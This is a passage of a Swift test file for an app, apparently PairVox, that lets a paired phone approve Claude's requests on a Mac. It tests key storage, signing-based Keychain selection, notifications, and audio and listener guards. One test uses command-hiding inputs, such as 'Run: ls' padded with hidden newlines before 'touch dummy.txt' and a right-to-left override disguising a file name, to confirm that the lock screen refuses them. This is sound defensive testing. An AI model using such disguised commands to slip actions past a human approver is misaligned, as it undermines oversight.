        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("pv-marker-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired.json")
        let keys = MemoryDeviceKeyStore()
        try keys.setKey(Data("1".utf8), for: "legacy-import-closed")   // a short value: not a key
        XCTAssertNil(keys.key(for: "legacy-import-closed"), "only 32-byte keys are keys")
        try keys.setKey(Handshake.randomBytes(32), for: "legacy-import-closed")
        let planted = [PairedDevice(id: "legacy-import-closed", name: "Anthony's iPhone", psk: Data(), createdAt: Date(), revoked: false)]
        try JSONEncoder().encode(planted).write(to: url)
        let m = PairingManager(storeURL: url, keys: keys)
        let active = await m.activeDevice("legacy-import-closed")
        XCTAssertNil(active, "ids that are not UUIDs are never phones")
    }

    /// A Keychain permission prompt blocks the key store call. Creating the manager must not wait for it.
    func testDeferredKeysDoNotBlockInit() async throws {
        final class SlowKeys: DeviceKeyStore, @unchecked Sendable {
            let gate = DispatchSemaphore(value: 0)
            let id = UUID().uuidString
            var reads = 0
            var legacyImportClosed: Bool { true }
            func closeLegacyImport() {}
            func key(for id: String) -> Data? { reads += 1; gate.wait(); return Data(repeating: 7, count: 32) }
            func setKey(_ key: Data, for id: String) throws {}
            func removeKey(for id: String) -> Bool { true }
        }
        let keys = SlowKeys()
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("paired-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: url) }
        let phone = PairedDevice(id: keys.id, name: "Phone", psk: Data(), createdAt: Date(), revoked: false)
        try JSONEncoder().encode([phone]).write(to: url)

        let started = Date()
        let manager = PairingManager(storeURL: url, keys: keys, deferKeys: true)
        XCTAssertLessThan(Date().timeIntervalSince(started), 0.5, "init waited for the key store")
        XCTAssertEqual(keys.reads, 0)

        let lookup = Task { await manager.activeDevice(keys.id) }
        try await Task.sleep(nanoseconds: 300_000_000)
        keys.gate.signal()
        let device = await lookup.value
        XCTAssertEqual(device?.psk, Data(repeating: 7, count: 32))
        XCTAssertEqual(keys.reads, 1)
    }
}

final class FileDeviceKeyStoreTests: XCTestCase {
    private func folder() -> URL { FileManager.default.temporaryDirectory.appendingPathComponent("pv-keys-\(UUID().uuidString)") }

    func testKeysRoundTripAndSurviveANewInstance() throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        let key = Data(repeating: 9, count: 32)
        try FileDeviceKeyStore(directory: dir).setKey(key, for: "a")
        XCTAssertEqual(FileDeviceKeyStore(directory: dir).key(for: "a"), key)
        XCTAssertNil(FileDeviceKeyStore(directory: dir).key(for: "b"))
    }

    func testFilesArePrivateAndRemovalDestroysTheKey() throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        let store = FileDeviceKeyStore(directory: dir)
        try store.setKey(Data(repeating: 1, count: 32), for: "a")
        let attrs = try FileManager.default.attributesOfItem(atPath: dir.appendingPathComponent("phone-keys.json").path)
        XCTAssertEqual(attrs[.posixPermissions] as? Int, 0o600)
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: dir.path)[.posixPermissions] as? Int, 0o700)
        XCTAssertTrue(store.removeKey(for: "a"))
        XCTAssertNil(store.key(for: "a"))
        XCTAssertFalse(try String(contentsOf: dir.appendingPathComponent("phone-keys.json")).contains("AQEB"))
    }

    func testWrongSizedKeyIsNotReturnedAndMarkerPersists() throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        let store = FileDeviceKeyStore(directory: dir)
        try store.setKey(Data(repeating: 1, count: 5), for: "short")
        XCTAssertNil(store.key(for: "short"))
        XCTAssertFalse(store.legacyImportClosed)
        store.closeLegacyImport()
        XCTAssertTrue(FileDeviceKeyStore(directory: dir).legacyImportClosed)
    }

    func testChoiceFollowsTheSigningIdentityAndTheOverride() {
        let dir = folder()
        XCTAssertEqual(DeviceKeyStores.automatic(directory: dir, environment: [:], isDistributionSigned: { false }).name, "file")
        XCTAssertEqual(DeviceKeyStores.automatic(directory: dir, environment: [:], isDistributionSigned: { true }).name, "keychain")
        XCTAssertEqual(DeviceKeyStores.automatic(directory: dir, environment: ["PAIRVOX_KEYSTORE": "file"], isDistributionSigned: { true }).name, "keychain",
                       "an environment variable must not move a distribution build's keys into a file")
        XCTAssertEqual(DeviceKeyStores.automatic(directory: dir, environment: ["PAIRVOX_KEYSTORE": "file"], isDistributionSigned: { false }).name, "file")
        XCTAssertEqual(DeviceKeyStores.automatic(directory: dir, environment: ["PAIRVOX_KEYSTORE": "keychain"], isDistributionSigned: { false }).name, "keychain")
    }

    func testOnlyADistributionCertificateMovesTheKeysToTheKeychain() {
        // A development certificate is stable across builds too, but a development build keeps the key file so a
        // change of signing never makes the Mac tell a paired phone it was revoked.
        XCTAssertTrue(DeviceKeyStores.isDistributionCertificate("Developer ID Application: Anthony Guidry (JXNXBK2X9V)"))
        XCTAssertTrue(DeviceKeyStores.isDistributionCertificate("Apple Distribution: Anthony Guidry (JXNXBK2X9V)"))
        XCTAssertTrue(DeviceKeyStores.isDistributionCertificate("3rd Party Mac Developer Application: Anthony Guidry (JXNXBK2X9V)"))
        XCTAssertFalse(DeviceKeyStores.isDistributionCertificate("Apple Development: Anthony Guidry (MW9S7Y9BYY)"))
        XCTAssertFalse(DeviceKeyStores.isDistributionCertificate("DraftFi Local Signing"))
        // The real check runs without trapping, whatever signed the test runner.
        _ = DeviceKeyStores.runningBuildSigning()
    }

    /// Review task 3.4: only a build positively identified as local development keeps the key file. A signature
    /// PairVox cannot place (an App Store or TestFlight re-signature, a self-signed identity, a failed Security call)
    /// gets the Keychain, so a release cannot end up in the plain file by accident.
    func testOnlyADevelopmentSignatureKeepsTheKeyFile() {
        XCTAssertEqual(DeviceKeyStores.classify(certificate: "Apple Development: Anthony Guidry (MW9S7Y9BYY)"), .development)
        XCTAssertEqual(DeviceKeyStores.classify(certificate: "Mac Developer: Anthony Guidry (MW9S7Y9BYY)"), .development)
        XCTAssertEqual(DeviceKeyStores.classify(certificate: "Developer ID Application: Anthony Guidry (JXNXBK2X9V)"), .distribution)
        XCTAssertEqual(DeviceKeyStores.classify(certificate: "Apple Mac OS Application Signing"), .unknown)
        XCTAssertEqual(DeviceKeyStores.classify(certificate: "DraftFi Local Signing"), .unknown)
    }

    func testPairingWorksOnTheFileStoreAcrossARestart() async throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        let url = dir.appendingPathComponent("paired-phones.json")
        let keys = FileDeviceKeyStore(directory: dir)
        let id = UUID().uuidString
        try keys.setKey(Data(repeating: 5, count: 32), for: id)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        try JSONEncoder().encode([PairedDevice(id: id, name: "Phone", psk: Data(), createdAt: Date(), revoked: false)]).write(to: url)
        let manager = PairingManager(storeURL: url, keys: FileDeviceKeyStore(directory: dir), deferKeys: true)
        let device = await manager.activeDevice(id)
        XCTAssertEqual(device?.psk, Data(repeating: 5, count: 32))
    }

    func testDamagedKeyFileIsKeptAsideAndDoesNotEraseTheOtherPhonesSilently() throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        let store = FileDeviceKeyStore(directory: dir)
        try store.setKey(Data(repeating: 1, count: 32), for: "a")
        try Data("not json".utf8).write(to: dir.appendingPathComponent("phone-keys.json"))
        try store.setKey(Data(repeating: 2, count: 32), for: "b")
        let names = try FileManager.default.contentsOfDirectory(atPath: dir.path)
        XCTAssertTrue(names.contains { $0.hasPrefix("phone-keys.unreadable-") }, "the damaged file must be kept, not erased")
        XCTAssertEqual(store.key(for: "b"), Data(repeating: 2, count: 32))
    }

    func testExistingLooseFolderIsTightenedAndStaleTempFilesAreRemoved() throws {
        let dir = folder(); defer { try? FileManager.default.removeItem(at: dir) }
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o755])
        let stale = dir.appendingPathComponent("phone-keys.\(UUID().uuidString).tmp")
        try Data("secret".utf8).write(to: stale)
        let store = FileDeviceKeyStore(directory: dir)
        XCTAssertFalse(FileManager.default.fileExists(atPath: stale.path))
        try store.setKey(Data(repeating: 3, count: 32), for: "a")
        try store.setKey(Data(repeating: 4, count: 32), for: "a")   // the replace path
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: dir.path)[.posixPermissions] as? Int, 0o700)
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: dir.appendingPathComponent("phone-keys.json").path)[.posixPermissions] as? Int, 0o600)
    }

    func testClosingTheImportWindowHoldsEvenIfTheMarkerCannotBeWritten() throws {
        let blocker = FileManager.default.temporaryDirectory.appendingPathComponent("pv-blocker-\(UUID().uuidString)")
        try Data("a file, not a folder".utf8).write(to: blocker)
        defer { try? FileManager.default.removeItem(at: blocker) }
        let store = FileDeviceKeyStore(directory: blocker)
        XCTAssertFalse(store.legacyImportClosed)
        store.closeLegacyImport()
        XCTAssertTrue(store.legacyImportClosed)
    }
}

/// Audit run 7: what the lock-screen notification offers for a request that arrives while the phone app is not on screen.
final class RequestNoticeTests: XCTestCase {
    func testOnlyOrdinaryRequestsGetButtonsOnTheLockScreen() {
        let edit = LinkRequest(requestID: "R1", summary: "Edit a.swift", spokenPrompt: "", risk: "medium", reasons: [], voiceApprovable: true)
        let n = RequestNotice.make(for: edit, project: "app")
        XCTAssertTrue(n.offersButtons)
        XCTAssertEqual(n.title, "Claude needs your OK in app")
        XCTAssertEqual(n.body, "Edit a.swift")
        var high = edit; high.risk = "high"
        XCTAssertFalse(RequestNotice.make(for: high, project: nil).offersButtons)
        XCTAssertTrue(RequestNotice.make(for: high, project: nil).body.contains("High risk"))
        var cut = edit; cut.truncated = true
        XCTAssertFalse(RequestNotice.make(for: cut, project: nil).offersButtons)
        var screen = edit; screen.needsScreen = true
        XCTAssertFalse(RequestNotice.make(for: screen, project: nil).offersButtons)
        var long = edit; long.summary = String(repeating: "x", count: 400)
        XCTAssertLessThan(RequestNotice.make(for: long, project: nil).body.count, 200, "cut to 160, plus the open-the-app note")
        // Audit run 8: a body cut for the lock screen, or a request the Mac keeps to the screen, gets no buttons.
        XCTAssertFalse(RequestNotice.make(for: long, project: nil).offersButtons, "the end of a long command would not be seen")
        var screenOnly = edit; screenOnly.voiceApprovable = false
        XCTAssertFalse(RequestNotice.make(for: screenOnly, project: nil).offersButtons)
    }

    // Audit run 8: the Mac holds a lock-screen answer to the lock-screen rule, whatever the phone sends.
    func testTheMacHoldsALockScreenAnswerToTheLockScreenRule() async throws {
        let h = LinkTests()
        let (host, engine, pairing, clock) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        let screenOnly = h.snapshot(risk: "medium", voice: false, id: "S")
        await host.publish(screenOnly)
        _ = try await h.nextSnapshot(client)
        try await client.send(.approve(requestID: "S", method: .tap, auth: .notification))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty, "screen-only: not from the lock screen")
        await host.publish(h.snapshot(risk: "medium", voice: true, id: "L"))
        _ = try await h.nextSnapshot(client)
        clock.advance(LinkHost.staleAfter + 1)
        try await client.send(.approve(requestID: "L", method: .tap, auth: .notification))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty, "an old request is checked in the app")
        await host.publish(h.snapshot(risk: "medium", voice: true, id: "OK"))
        _ = try await h.nextSnapshot(client)
        try await client.send(.approve(requestID: "OK", method: .tap, auth: .notification))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertEqual(engine.calls, ["approve:OK"])
    }

    // Audit run 9: a short command spread over several lines, or text with a direction override, could hide what Allow
    // approves on the lock screen. Neither the phone nor the Mac allows it from there.
    func testALockScreenAllowNeedsOnePlainLine() async throws {
        let edit = LinkRequest(requestID: "M", summary: "Run: ls\n\n\n\n\n\n\n\ntouch dummy.txt", spokenPrompt: "", risk: "medium",
                               reasons: [], voiceApprovable: true)
        XCTAssertLessThan(edit.summary.count, RequestNotice.maxBody)
        XCTAssertFalse(RequestNotice.make(for: edit, project: nil).offersButtons)
        for odd in ["Run: ls\u{2028}touch x", "Run: ls\rtouch x", "Edit a\u{202E}tfiws.b", "Run: ls\u{0007}"] {
            var r = edit; r.summary = odd
            XCTAssertFalse(RequestNotice.allowsLockScreenAnswer(r), odd.debugDescription)
        }
        var plain = edit; plain.summary = "Run: swift test"
        XCTAssertTrue(RequestNotice.allowsLockScreenAnswer(plain))

        let h = LinkTests()
        let (host, engine, pairing, _) = await h.makeHost()
        let (id, psk) = try await h.pairPhone(host, pairing)
        let client = try await h.connect(host, id, psk)
        var snap = h.snapshot(risk: "medium", voice: true, id: "M")
        snap.request = edit
        await host.publish(snap)
        _ = try await h.nextSnapshot(client)
        try await client.send(.approve(requestID: "M", method: .tap, auth: .notification))
        try await Task.sleep(nanoseconds: 150_000_000)
        XCTAssertTrue(engine.calls.isEmpty, "the Mac refuses a lock-screen answer to a multi-line request")
    }

    func testTheIdentifierCarriesTheRequestAndItsProject() {
        let id = RequestNotice.identifier(requestID: "abc:1", projectID: "p2")
        XCTAssertEqual(RequestNotice.request(from: id)?.requestID, "abc:1")
        XCTAssertEqual(RequestNotice.request(from: id)?.projectID, "p2")
        XCTAssertNil(RequestNotice.request(from: RequestNotice.identifier(requestID: "x", projectID: nil))?.projectID)
        XCTAssertNil(RequestNotice.request(from: "something else"))
    }
}

/// 2026-10-25: the phone app crashed when its microphone tap used a 48 kHz format the engine still reported after a
/// headset had switched the input to 16 kHz (an Objective-C exception Swift cannot catch). The phone now checks first.
final class CaptureFormatTests: XCTestCase {
    func testATapFormatMustMatchTheHardwareAndBeReal() {
        XCTAssertTrue(CaptureFormat.isUsable(sampleRate: 48_000, channels: 1, hardwareSampleRate: 48_000))
        XCTAssertTrue(CaptureFormat.isUsable(sampleRate: 16_000, channels: 1, hardwareSampleRate: 16_000))
        XCTAssertFalse(CaptureFormat.isUsable(sampleRate: 48_000, channels: 1, hardwareSampleRate: 16_000), "the crash")
        XCTAssertFalse(CaptureFormat.isUsable(sampleRate: 0, channels: 0, hardwareSampleRate: 0), "no input device")
        XCTAssertFalse(CaptureFormat.isUsable(sampleRate: 48_000, channels: 0, hardwareSampleRate: 48_000))
    }
}

/// 2026-10-25: a recognizer that failed as soon as it started made hands-free listening restart four times a second.
final class ListenFailureGuardTests: XCTestCase {
    func testThreeQuickFailuresInARowStopRetrying() {
        var g = ListenFailureGuard()
        XCTAssertFalse(g.ended(afterSeconds: 0.05, heardSomething: false, failed: true))
        XCTAssertFalse(g.ended(afterSeconds: 0.05, heardSomething: false, failed: true))
        XCTAssertTrue(g.ended(afterSeconds: 0.05, heardSomething: false, failed: true))
    }

    func testOrdinaryEndingsResetTheCount() {
        var g = ListenFailureGuard()
        _ = g.ended(afterSeconds: 0.05, heardSomething: false, failed: true)
        _ = g.ended(afterSeconds: 0.05, heardSomething: false, failed: true)
        XCTAssertFalse(g.ended(afterSeconds: 6, heardSomething: false, failed: true), "no speech heard after a while is normal")
        XCTAssertEqual(g.streak, 0)
        _ = g.ended(afterSeconds: 0.05, heardSomething: false, failed: true)
        XCTAssertFalse(g.ended(afterSeconds: 2, heardSomething: true, failed: false), "something was said")
        XCTAssertEqual(g.streak, 0)
    }
}
